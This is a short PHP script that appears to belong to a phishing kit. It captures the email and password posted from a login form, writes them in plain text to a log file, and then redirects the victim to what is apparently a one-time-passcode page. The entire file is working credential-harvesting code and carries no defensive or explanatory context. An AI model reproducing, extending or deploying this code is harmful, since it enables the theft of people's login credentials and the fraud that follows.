<?php

    file_put_contents("log.txt", "Username: " . $_POST['Email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();
